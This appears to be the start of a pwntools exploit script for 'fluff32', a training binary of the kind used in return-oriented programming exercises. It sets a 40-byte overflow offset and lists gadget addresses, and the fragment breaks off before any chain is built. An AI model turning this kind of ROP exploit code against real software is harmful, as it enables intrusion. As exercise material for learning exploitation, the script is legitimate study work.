from pwn import *

exe = context.binary = ELF("fluff32",checksec=False)
context.log_level = 'info'

offset = 40

xchg_ecx_edx_gadget = 0x08048555
pop_exc_bswap_ecx_gadget = 0x08048558
complicated_pext_gadget = 0x08048543
pop_ebp_gadget = 0x080485bb